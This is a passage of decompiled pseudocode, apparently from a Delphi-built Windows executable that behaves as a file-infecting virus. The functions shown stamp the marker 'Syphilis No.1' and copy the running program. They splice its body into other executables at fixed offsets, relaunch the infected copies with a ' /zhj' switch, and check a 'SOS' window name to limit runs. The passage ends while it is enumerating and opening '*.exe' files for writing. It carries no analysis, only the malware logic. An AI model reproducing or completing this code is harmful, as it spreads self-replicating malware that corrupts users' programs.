// 422E1C: using guessed type int dword_422E1C[4];
// 42B514: using guessed type int dword_42B514;
// 42B51A: using guessed type char byte_42B51A;
// 42B51B: using guessed type _DWORD aMsSansSerif[8];
// 42BA94: using guessed type int *off_42BA94;

//----- (00422E88) --------------------------------------------------------
_DWORD *__usercall sub_422E88@<eax>(int a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  _DWORD *v3; // esi
  char v5; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = sub_403864(a1, a2, v5);
  v2 = a2;
  v3 = (_DWORD *)a1;
  InitializeCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
  if ( v2 )
    sub_4038BC(v3);
  return v3;
}
// 422E91: variable 'v5' is possibly undefined
// 422E96: variable 'a2' is possibly undefined

//----- (00422EC0) --------------------------------------------------------
void __usercall sub_422EC0(_DWORD *a1@<eax>, char a2@<dl>)
{
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi

  v2 = sub_4038CC(a1, a2);
  v4 = v3;
  v5 = v2;
  sub_422F04((int)v2);
  DeleteCriticalSection_0((LPCRITICAL_SECTION)(v5 + 2));
  if ( v4 > 0 )
    sub_4038B4(v5);
}
// 422EC7: variable 'v3' is possibly undefined

//----- (00422EEC) --------------------------------------------------------
void __usercall sub_422EEC(int a1@<eax>)
{
  EnterCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (00422EF8) --------------------------------------------------------
void __usercall sub_422EF8(int a1@<eax>)
{
  LeaveCriticalSection_0((LPCRITICAL_SECTION)(a1 + 8));
}

//----- (00422F04) --------------------------------------------------------
_DWORD *__usercall sub_422F04@<eax>(int a1@<eax>)
{
  _DWORD *v1; // eax
  _DWORD *result; // eax
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  _DWORD *v5; // [esp+0h] [ebp-Ch]
  int v6; // [esp+4h] [ebp-8h]
  int v7; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v7 = a1;
  while ( 1 )
  {
    result = *(_DWORD **)(v7 + 4);
    if ( !result )
      break;
    v6 = *(_DWORD *)(v7 + 4);
    v5 = result;
    sub_422EEC(v7);
    v4 = &savedregs;
    v3[1] = (unsigned int)&loc_422F4F;
    v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v3);
    *(_DWORD *)(v7 + 4) = *v5;
    __writefsdword(0, v3[0]);
    v4 = (int *)&loc_422F56;
    sub_422EF8(v7);
    v1 = (_DWORD *)v5[1];
    if ( v1 )
      sub_403534(v1);
    sub_402700(v6);
  }
  return result;
}

//----- (00422F7C) --------------------------------------------------------
int sub_422F7C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_423045;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_42CC04 )
  {
    sub_403534((_DWORD *)dword_42CC5C);
    sub_403534((_DWORD *)dword_42B788);
    sub_403534((_DWORD *)dword_42B784);
    sub_4226DC();
    sub_403534((_DWORD *)dword_42B78C);
    sub_403534((_DWORD *)dword_42CC58);
    sub_403534((_DWORD *)dword_42CC4C);
    sub_403534((_DWORD *)dword_42CC50);
    sub_403534((_DWORD *)dword_42CC54);
    DeleteObject(ho);
    DeleteCriticalSection_0(&stru_42CC1C);
    DeleteCriticalSection_0(&stru_42CC34);
    sub_404CE4(&dword_42B6C4, (char *)dword_418170, 18);
    sub_404CE4(&dword_42B53C, (char *)dword_418170, 49);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 418170: using guessed type int dword_418170[6];
// 42B53C: using guessed type int dword_42B53C;
// 42B6C4: using guessed type int dword_42B6C4;
// 42B784: using guessed type int dword_42B784;
// 42B788: using guessed type int dword_42B788;
// 42B78C: using guessed type int dword_42B78C;
// 42CC04: using guessed type int dword_42CC04;
// 42CC4C: using guessed type int dword_42CC4C;
// 42CC50: using guessed type int dword_42CC50;
// 42CC54: using guessed type int dword_42CC54;
// 42CC58: using guessed type int dword_42CC58;
// 42CC5C: using guessed type int dword_42CC5C;

//----- (00423050) --------------------------------------------------------
void __usercall sub_423050(int a1@<ebx>)
{
  if ( dword_42CC04-- == 0 )
  {
    sub_422D40();
    InitializeCriticalSection_0(&stru_42CC1C);
    InitializeCriticalSection_0(&stru_42CC34);
    h = GetStockObject(7);
    dword_42CC10 = GetStockObject(5);
    dword_42CC14 = GetStockObject(13);
    dword_42CC18 = (int)LoadIconA(0, (LPCSTR)0x7F00);
    sub_422DBC(a1);
    dword_42CC4C = (int)sub_420964((int)dword_420950, 1, 44);
    dword_42CC50 = (int)sub_420964((int)dword_420950, 1, 16);
    dword_42CC54 = (int)sub_420964((int)dword_420950, 1, 16);
    dword_42CC5C = (int)sub_422E88((int)dword_422E78, 1);
    dword_42B78C = (int)sub_418E2C(dword_417688, 1);
    dword_42CC58 = (int)sub_418E2C(dword_417688, 1);
    sub_4187AC((int)dword_420520, (int)sub_420DFC, (int)sub_420DEC);
    sub_4187AC((int)dword_4205FC, (int)sub_420FD0, (int)sub_420FC0);
  }
}
// 417688: using guessed type int dword_417688[3];
// 420520: using guessed type int dword_420520[5];
// 4205FC: using guessed type int dword_4205FC[21];
// 420950: using guessed type int dword_420950[5];
// 422E78: using guessed type int dword_422E78[4];
// 42B78C: using guessed type int dword_42B78C;
// 42CC04: using guessed type int dword_42CC04;
// 42CC18: using guessed type int dword_42CC18;
// 42CC4C: using guessed type int dword_42CC4C;
// 42CC50: using guessed type int dword_42CC50;
// 42CC54: using guessed type int dword_42CC54;
// 42CC58: using guessed type int dword_42CC58;
// 42CC5C: using guessed type int dword_42CC5C;

//----- (00423168) --------------------------------------------------------
int __usercall sub_423168@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>, int a4@<ebx>)
{
  char *v5; // eax
  int v6; // eax
  unsigned int v8[2]; // [esp-10h] [ebp-30h] BYREF
  int *v9; // [esp-8h] [ebp-28h]
  int v10; // [esp-4h] [ebp-24h]
  char *v11; // [esp+0h] [ebp-20h] BYREF
  char *v12; // [esp+4h] [ebp-1Ch] BYREF
  char *v13; // [esp+8h] [ebp-18h] BYREF
  char *v14; // [esp+Ch] [ebp-14h] BYREF
  char *v15; // [esp+10h] [ebp-10h] BYREF
  char *v16; // [esp+14h] [ebp-Ch] BYREF
  int v17; // [esp+18h] [ebp-8h]
  __int32 v18; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  v14 = 0;
  v13 = 0;
  v12 = 0;
  v11 = 0;
  v10 = a4;
  v17 = a2;
  v18 = a1;
  sub_40470C(a1);
  sub_40470C(v17);
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_423294;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_404304((volatile __int32 *)&v15, v18);
  if ( sub_40C2F4(v15) )
  {
    v5 = sub_40471C(v15);
    sub_40445C(&v13, v5);
    sub_407F14(v13);
    sub_404304((volatile __int32 *)&v16, (__int32)v15);
    sub_40426C(&v14);
    sub_408010(v15, &v12);
    sub_404304((volatile __int32 *)&v15, (__int32)v12);
    while ( sub_40C2F4(v16) )
    {
      v6 = sub_404524((int)v16);
      sub_4047BC(&v16, v6 - 3, 4);
      sub_40452C(&v14, (__int32)&dword_4232A8);
      sub_4045E4((volatile __int32 *)&v16, 3);
      sub_408044(v16, &v11);
      sub_404570((volatile __int32 *)&v16, v15, v11);
    }
    sub_404304((volatile __int32 *)&v15, (__int32)v16);
  }
  sub_4042C0(a3, (__int32)v15);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_42329B;
  return sub_404290((int)&v11, 8);
}
// 423168: could not find valid save-restore pair for ebx
// 4232A8: using guessed type int dword_4232A8;

//----- (004232AC) --------------------------------------------------------
int __usercall sub_4232AC@<eax>(char *a1@<eax>, int a2@<edx>)
{
  int v3; // ebx
  int v4; // ebx
  int v5; // esi
  char v6; // zf
  unsigned int v8[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v9; // [esp-4h] [ebp-14h]
  char *v10; // [esp+8h] [ebp-8h] BYREF
  char *v11; // [esp+Ch] [ebp-4h] BYREF
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10 = 0;
  v11 = a1;
  sub_40470C((int)a1);
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_42335F;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_405748(&dword_42CCE0, (int)dword_423150, (void *)1, a2);
  v3 = a2 - 1;
  if ( v3 >= 0 )
  {
    v4 = v3 + 1;
    v5 = 0;
    do
    {
      Delphi_Copy_40477C((int)v11, 1, 1, &v10);
      Delphi_CompareCall_404668((int)v10, &dword_423374);
      if ( v6 )
        *(_BYTE *)(dword_42CCE0 + v5) = 1;
      else
        *(_BYTE *)(dword_42CCE0 + v5) = 0;
      sub_4047BC(&v11, 1, 2);
      ++v5;
      --v4;
    }
    while ( v4 );
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_423366;
  return sub_404290((int)&v10, 2);
}
// 423318: variable 'v6' is possibly undefined
// 423150: using guessed type int dword_423150[3];
// 423374: using guessed type int dword_423374;
// 42CCE0: using guessed type int dword_42CCE0;

//----- (00423378) --------------------------------------------------------
int __usercall sub_423378@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  char v2; // zf
  char *v4; // [esp-1Ch] [ebp-190h]
  unsigned int v5[2]; // [esp-18h] [ebp-18Ch] BYREF
  int *v6; // [esp-10h] [ebp-184h]
  unsigned int v7[2]; // [esp-Ch] [ebp-180h] BYREF
  int *v8; // [esp-4h] [ebp-178h]
  char *v9; // [esp+0h] [ebp-174h] BYREF
  char *v10; // [esp+4h] [ebp-170h] BYREF
  char *v11; // [esp+8h] [ebp-16Ch] BYREF
  char v12[4]; // [esp+Ch] [ebp-168h] BYREF
  int v13; // [esp+10h] [ebp-164h]
  __int32 v14; // [esp+18h] [ebp-15Ch]
  __int32 v15; // [esp+164h] [ebp-10h] BYREF
  int v16; // [esp+168h] [ebp-Ch]
  char *v17; // [esp+16Ch] [ebp-8h] BYREF
  char *v18; // [esp+170h] [ebp-4h]
  int savedregs; // [esp+174h] [ebp+0h] BYREF

  v10 = 0;
  v9 = 0;
  v11 = 0;
  v15 = 0;
  v17 = a2;
  v18 = a1;
  sub_40470C((int)a1);
  sub_40470C((int)v17);
  sub_404BEC((int)v12, (int)dword_406E20);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4234CC;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  v16 = 0;
  sub_404570((volatile __int32 *)&v11, v18, v17);
  if ( !sub_407E84(v11, 63, (int)v12) )
  {
    v6 = &savedregs;
    v5[1] = (unsigned int)&loc_423481;
    v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v5);
    while ( 1 )
    {
      sub_404304(&v15, v14);
      sub_40C214(v15, &v10);
      v4 = v10;
      sub_40C214((int)v17, &v9);
      Delphi_CompareCall_404668((int)v4, (int *)v9);
      if ( v2 )
        break;
      if ( sub_407ED4((int)v12) )
        goto LABEL_6;
    }
    v16 = v13;
LABEL_6:
    __writefsdword(0, v5[0]);
    v6 = (int *)&loc_423488;
    sub_407EF8((int)v12);
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_4234D3;
  sub_404290((int)&v9, 3);
  sub_404CB0((int)v12, (int)dword_406E20);
  sub_40426C(&v15);
  sub_404290((int)&v17, 2);
  return v16;
}
// 42344C: variable 'v2' is possibly undefined
// 406E20: using guessed type int dword_406E20[5];
// 423378: using guessed type char var_168[4];

//----- (004234DC) --------------------------------------------------------
int __userpurge sub_4234DC@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4, int a5)
{
  int v9; // [esp+Ch] [ebp-8h]
  int v10; // [esp+10h] [ebp-4h]

  v10 = sub_41AAA0(a1);
  v9 = sub_41AAA0(a3);
  (*(void (__fastcall **)(_DWORD, int))(*(_DWORD *)a1 + 16))(0, a2);
  (*(void (__fastcall **)(_DWORD, int))(*(_DWORD *)a3 + 16))(0, a5);
  sub_41AD3C(a3, a1, a4);
  (*(void (__fastcall **)(_DWORD, int))(*(_DWORD *)a1 + 16))(0, v10);
  return (*(int (__fastcall **)(_DWORD, int))(*(_DWORD *)a3 + 16))(0, v9);
}

//----- (00423548) --------------------------------------------------------
char __usercall sub_423548@<al>(char *a1@<eax>, char *a2@<edx>)
{
  int v2; // ecx
  char v3; // zf
  __int64 v4; // rax
  _DWORD v6[3]; // [esp+8h] [ebp-60h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp+14h] [ebp-54h] BYREF
  void *v8; // [esp+18h] [ebp-50h]
  int *v9; // [esp+1Ch] [ebp-4Ch]
  char *ExceptionList; // [esp+20h] [ebp-48h] BYREF
  void *v11; // [esp+24h] [ebp-44h]
  int *v12; // [esp+28h] [ebp-40h]
  void *v13; // [esp+2Ch] [ebp-3Ch]
  char *v14; // [esp+38h] [ebp-30h] BYREF
  char *v15; // [esp+3Ch] [ebp-2Ch] BYREF
  char v16[16]; // [esp+40h] [ebp-28h] BYREF
  int v17; // [esp+50h] [ebp-18h]
  _DWORD *v18; // [esp+54h] [ebp-14h]
  _DWORD *v19; // [esp+58h] [ebp-10h]
  char v20; // [esp+5Fh] [ebp-9h]
  char *v21; // [esp+60h] [ebp-8h] BYREF
  char *v22; // [esp+64h] [ebp-4h]
  int savedregs; // [esp+68h] [ebp+0h] BYREF

  v15 = 0;
  v14 = 0;
  v21 = a2;
  v22 = a1;
  sub_40470C((int)a1);
  sub_40470C((int)v21);
  v12 = &savedregs;
  v11 = &loc_4236E8;
  ExceptionList = (char *)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v20 = 0;
  v9 = &savedregs;
  v8 = &loc_4236AA;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v7);
  v18 = sub_403504(&off_417DB0, 1);
  v19 = sub_41AF50((int)&off_417CC0, 1, v22, 64);
  v6[2] = &savedregs;
  v6[1] = &loc_423699;
  v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  LOWORD(v2) = 2;
  (*(void (__fastcall **)(int, int, _DWORD, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, char *))(*v19 + 16))(
    v2,
    -20,
    v6[0],
    &loc_423699,
    &savedregs,
    v7,
    v8,
    v9,
    ExceptionList);
  sub_41ACCC(20, v16);
  qmemcpy(&unk_42CCBC, "\rSyphilis No.1", 14);
  sub_402DD8((int)v16, (int)"\rSyphilis No.1", (unsigned __int8)v16[0] + 1);
  if ( v3 )
  {
    dword_42CCCC = v17;
    (*(void (__fastcall **)(_DWORD, int))(*v19 + 16))(0, v17);
    v4 = sub_41AAD4((int)v19);
    sub_41AD3C((int)v18, (int)v19, v4 - v17 - 20);
    sub_41B10C((int)v18, v21);
    v20 = 1;
  }
  else
  {
    sub_408044(v22, &v15);
    ExceptionList = v15;
    sub_408010(v22, &v14);
    dword_42CCCC = sub_423378(v14, ExceptionList);
  }
  __writefsdword(0, (unsigned int)v11);
  v13 = &loc_4236A0;
  sub_403534(v18);
  sub_403534(v19);
  __writefsdword(0, (unsigned int)v8);
  __writefsdword(0, (unsigned int)v11);
  v13 = &loc_4236EF;
  sub_404290((int)&v14, 2);
  sub_404290((int)&v21, 2);
  return v20;
}
// 4235CE: variable 'v2' is possibly undefined
// 423602: variable 'v3' is possibly undefined
// 417CC0: using guessed type int (*off_417CC0)();
// 417DB0: using guessed type int (*off_417DB0)();
// 41ACCC: using guessed type int __fastcall sub_41ACCC(_DWORD, _DWORD);
// 42CCCC: using guessed type int dword_42CCCC;

//----- (0042370C) --------------------------------------------------------
_DWORD *__usercall sub_42370C@<eax>(char *a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  char *v5; // eax
  HICON IconA; // eax
  int v7; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v9; // [esp-3Ch] [ebp-64h] BYREF
  void *v10; // [esp-38h] [ebp-60h]
  unsigned int v11; // [esp-34h] [ebp-5Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-30h] [ebp-58h] BYREF
  int *v13; // [esp-2Ch] [ebp-54h]
  int (*v14)(); // [esp-28h] [ebp-50h]
  _DWORD v15[3]; // [esp-24h] [ebp-4Ch] BYREF
  _DWORD v16[6]; // [esp-18h] [ebp-40h] BYREF
  char *v17; // [esp+0h] [ebp-28h] BYREF
  char v18; // [esp+7h] [ebp-21h]
  _DWORD *v19; // [esp+8h] [ebp-20h]
  _DWORD *v20; // [esp+Ch] [ebp-1Ch]
  _DWORD *v21; // [esp+10h] [ebp-18h]
  _DWORD *v22; // [esp+14h] [ebp-14h]
  _DWORD *v23; // [esp+18h] [ebp-10h]
  int v24; // [esp+20h] [ebp-8h]
  char *v25; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v16[5] = a3;
  v16[4] = a5;
  v16[3] = a4;
  v17 = 0;
  v24 = a2;
  v25 = a1;
  sub_40470C((int)a1);
  v16[2] = &savedregs;
  v16[1] = sub_423989;
  v16[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v16);
  v15[2] = &savedregs;
  v15[1] = &sub_423955;
  v15[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  v21 = sub_403504(&off_417DB0, 1);
  v20 = sub_403504(&off_417DB0, 1);
  v14 = (int (*)())&savedregs;
  v13 = (int *)&loc_423944;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v19 = sub_422894(off_420878, 1);
  v18 = 0;
  v11 = (unsigned int)&savedregs;
  v10 = &loc_4237EA;
  v9 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v9);
  sub_422C64(v19);
  v5 = sub_40471C(v25);
  IconA = ExtractIconA(hmod, v5, 0);
  sub_422CA0((int)v19, (int)IconA);
  if ( sub_4229D0((HICON)v19) )
  {
    v18 = 1;
    (*(void (**)(void))(*v19 + 88))();
  }
  __writefsdword(0, (unsigned int)v9);
  v11 = (unsigned int)&loc_4237F1;
  sub_403534(v19);
  v22 = sub_41AF50((int)&off_417CC0, 1, v25, 0);
  v11 = 64;
  sub_4029D0(0, &v17);
  v23 = sub_41AF50((int)&off_417CC0, 1, v17, v11);
  v11 = (unsigned int)&savedregs;
  v10 = &loc_4238E9;
  v9 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v9);
  if ( v18 )
  {
    sub_4234DC((int)v23, 0, (int)v20, 194432, 0);
    sub_4234DC((int)v21, 22, (int)v20, 744, 194432);
    sub_4234DC((int)v23, 195176, (int)v20, dword_42CCCC - 195176, 195176);
  }
  else
  {
    sub_4234DC((int)v23, 0, (int)v20, dword_42CCCC, 0);
  }
  sub_4234DC((int)v22, 0, (int)v20, v24, dword_42CCCC);
  LOWORD(v7) = 2;
  (*(void (__fastcall **)(int, _DWORD))(*v20 + 16))(v7, 0);
  sub_41AD04(20, &unk_42CCBC);
  __writefsdword(0, (unsigned int)v9);
  v11 = (unsigned int)&loc_4238F0;
  sub_403534(v23);
  __writefsdword(0, (unsigned int)ExceptionList);
  v14 = sub_42394B;
  sub_403534(v22);
  sub_403534(v21);
  v13 = &savedregs;
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_42393C;
  v11 = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v11);
  sub_41B10C((int)v20, v25);
  __writefsdword(0, v11);
  v13 = (int *)&locret_423943;
  return sub_403534(v20);
}
// 4238BE: variable 'v7' is possibly undefined
// 417CC0: using guessed type int (*off_417CC0)();
// 417DB0: using guessed type int (*off_417DB0)();
// 41AD04: using guessed type int __fastcall sub_41AD04(_DWORD, _DWORD);
// 420878: using guessed type int (*off_420878[3])();
// 42394B: using guessed type int sub_42394B();
// 42CCCC: using guessed type int dword_42CCCC;

//----- (0042399C) --------------------------------------------------------
int __usercall sub_42399C@<eax>(char *a1@<eax>, char *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  char *v5; // eax
  int v6; // eax
  char *v7; // eax
  char *v9; // [esp-14h] [ebp-24h]
  char *v10; // [esp-10h] [ebp-20h]
  unsigned int v11[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v12; // [esp-4h] [ebp-14h]
  char *v13; // [esp+0h] [ebp-10h] BYREF
  char *v14; // [esp+4h] [ebp-Ch] BYREF
  char *v15; // [esp+8h] [ebp-8h] BYREF
  char *v16; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v14 = 0;
  v13 = 0;
  v15 = a2;
  v16 = a1;
  sub_40470C((int)a1);
  sub_40470C((int)v15);
  v12 = &savedregs;
  v11[1] = (unsigned int)&loc_423AA5;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  sub_40D0BC((int)v15);
  v9 = sub_40471C(v15);
  v5 = sub_40471C(v16);
  CopyFileA(v5, v9, 0);
  sub_408044(v15, &v14);
  v10 = v14;
  sub_408010(v15, &v13);
  v6 = sub_423378(v13, v10);
  sub_42370C(v15, v6, a3, a4, a5);
  sub_407DF8(v15, 2u);
  sub_40452C(&v15, (__int32)" /zhj");
  sub_402E48((char *)&StartupInfo, 68, 0);
  StartupInfo.cb = 68;
  StartupInfo.dwFlags = 1;
  StartupInfo.wShowWindow = 1;
  v7 = sub_40471C(v15);
  CreateProcessA(0, v7, 0, 0, -1, 0x30u, 0, 0, &StartupInfo, &ProcessInformation);
  __writefsdword(0, v11[0]);
  v12 = (int *)&loc_423AAC;
  return sub_404290((int)&v13, 4);
}

//----- (00423AC0) --------------------------------------------------------
_DWORD *__usercall sub_423AC0@<eax>(
        char *a1@<eax>,
        char *a2@<edx>,
        int a3@<ecx>,
        int a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *v8; // [esp-34h] [ebp-48h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-30h] [ebp-44h] BYREF
  int *v10; // [esp-2Ch] [ebp-40h]
  int (*v11)(); // [esp-28h] [ebp-3Ch]
  _DWORD v12[3]; // [esp-24h] [ebp-38h] BYREF
  _DWORD v13[6]; // [esp-18h] [ebp-2Ch] BYREF
  _DWORD *v14; // [esp+0h] [ebp-14h]
  _DWORD *v15; // [esp+4h] [ebp-10h]
  char v16; // [esp+Bh] [ebp-9h]
  char *v17; // [esp+Ch] [ebp-8h]
  char *v18; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v13[5] = a4;
  v13[4] = a6;
  v13[3] = a5;
  v17 = a2;
  v18 = a1;
  sub_40470C((int)a1);
  sub_40470C((int)v17);
  v13[2] = &savedregs;
  v13[1] = sub_423BD4;
  v13[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  v12[2] = &savedregs;
  v12[1] = sub_423BA3;
  v12[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v16 = 0;
  v15 = sub_41AF50((int)&off_417CC0, 1, v18, 64);
  v14 = sub_403504(&off_417DB0, 1);
  v11 = (int (*)())&savedregs;
  v10 = (int *)&loc_423B92;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_4234DC((int)v15, 0, (int)v14, a3, 0);
  v16 = 1;
  __writefsdword(0, (unsigned int)ExceptionList);
  v11 = sub_423B99;
  sub_403534(v15);
  v10 = &savedregs;
  ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)&loc_423B8A;
  v8 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v8);
  sub_41B10C((int)v14, v17);
  __writefsdword(0, (unsigned int)v8);
  v10 = (int *)&locret_423B91;
  return sub_403534(v14);
}
// 417CC0: using guessed type int (*off_417CC0)();
// 417DB0: using guessed type int (*off_417DB0)();
// 423B99: using guessed type int sub_423B99();
// 423BA3: using guessed type int __cdecl sub_423BA3(int, int, int, int, int, int, int, int, int, int);

//----- (00423BE8) --------------------------------------------------------
int __usercall sub_423BE8@<eax>(char *a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  int v4; // eax
  char *v5; // eax
  UINT v6; // eax
  char *v7; // eax
  HANDLE FileA_0; // eax
  int v9; // ebx
  int v10; // esi
  int v11; // ecx
  int v12; // ebx
  char v13; // zf
  DWORD v15; // [esp-24h] [ebp-1F8h] BYREF
  DWORD v16; // [esp-20h] [ebp-1F4h]
  int *v17; // [esp-1Ch] [ebp-1F0h]
  struct _EXCEPTION_REGISTRATION_RECORD *v18; // [esp-18h] [ebp-1ECh] BYREF
  void *v19; // [esp-14h] [ebp-1E8h]
  int *v20; // [esp-10h] [ebp-1E4h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-1E0h] BYREF
  void *v22; // [esp-8h] [ebp-1DCh]
  int *v23; // [esp-4h] [ebp-1D8h]
  void *v24; // [esp+0h] [ebp-1D4h]
  __int32 v25; // [esp+Ch] [ebp-1C8h] BYREF
  char *v26; // [esp+10h] [ebp-1C4h] BYREF
  char *v27; // [esp+14h] [ebp-1C0h] BYREF
  char *v28; // [esp+18h] [ebp-1BCh] BYREF
  char *v29; // [esp+1Ch] [ebp-1B8h] BYREF
  char *v30; // [esp+20h] [ebp-1B4h] BYREF
  __int32 v31; // [esp+24h] [ebp-1B0h] BYREF
  char *v32; // [esp+28h] [ebp-1ACh] BYREF
  struct tagMSG Msg; // [esp+2Ch] [ebp-1A8h] BYREF
  char v34[20]; // [esp+48h] [ebp-18Ch] BYREF
  char v35[4]; // [esp+5Ch] [ebp-178h] BYREF
  int v36; // [esp+60h] [ebp-174h]
  int v37; // [esp+64h] [ebp-170h]
  char *v38; // [esp+68h] [ebp-16Ch]
  char *v39; // [esp+1B4h] [ebp-20h] BYREF
  char v40[2]; // [esp+1BAh] [ebp-1Ah] BYREF
  int *v41; // [esp+1BCh] [ebp-18h]
  unsigned __int8 v42; // [esp+1C2h] [ebp-12h]
  unsigned __int8 v43; // [esp+1C3h] [ebp-11h]
  char *v44; // [esp+1C4h] [ebp-10h] BYREF
  char *v45; // [esp+1C8h] [ebp-Ch] BYREF
  char *v46; // [esp+1CCh] [ebp-8h] BYREF
  char *v47; // [esp+1D0h] [ebp-4h] BYREF
  int savedregs; // [esp+1D4h] [ebp+0h] BYREF

  v47 = a1;
  sub_40470C((int)a1);
  sub_404BEC((int)v35, (int)dword_406E20);
  v23 = &savedregs;
  v22 = &loc_424035;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v4 = sub_404524((int)v47);
  if ( v47[v4 - 1] != 92 )
    sub_40452C(&v47, (__int32)&dword_42404C);
  if ( dword_42CCD0 <= 1 && dword_42CCD4 < 5 && !FindWindowA("TN1aN1a1D1E", "SOS") )
  {
    ++dword_42CCD4;
    sub_4029D0(0, &v32);
    sub_407F7C(v32, (char *)dword_424068, (volatile __int32 *)&v39);
    sub_423168((int)v39, (int)dword_424068, &v31, a2);
    sub_404304((volatile __int32 *)&v39, v31);
    sub_4029D0(0, &v30);
    if ( (unsigned __int8)sub_423AC0(v30, v39, dword_42CCCC, a2, a3, a4) )
    {
      sub_407DF8(v39, 2u);
      sub_40D0BC((int)v39);
      sub_404570((volatile __int32 *)&v29, v39, " /zhj");
      v5 = sub_40471C(v29);
      v6 = WinExec(v5, 5u);
      if ( v6 && v6 != 11 && v6 != 2 && v6 != 3 )
      {
        ++dword_42CCD0;
        Sleep_0(0x32u);
      }
      if ( sub_40C2F4(v39) )
        sub_407F14(v39);
    }
  }
  sub_404570((volatile __int32 *)&v46, v47, "*.exe");
  if ( !sub_407E84(v46, 63, (int)v35) )
  {
    do
    {
      PeekMessageA(&Msg, 0, 0, 0, 1u);
      if ( v37 != 16 )
      {
        sub_4029D0(0, &v27);
        sub_40C214((int)v27, &v28);
        v20 = (int *)v28;
        sub_40C214((int)v38, &v26);
        if ( (int)sub_404804(v26, v20) <= 0 )
        {
          sub_404570((volatile __int32 *)&v45, v47, v38);
          v20 = &savedregs;
          v19 = &loc_423F2C;
          v18 = NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)&v18);
          v17 = 0;
          v16 = 128;
          v15 = 3;
          v7 = sub_40471C(v45);
          FileA_0 = CreateFileA_0(v7, 0xC0000000, 0, 0, v15, v16, v17);
          if ( FileA_0 != (HANDLE)-1 )
          {
            sub_407DF0(FileA_0);
            v43 = 0;
            v42 = 0;
            v17 = &savedregs;
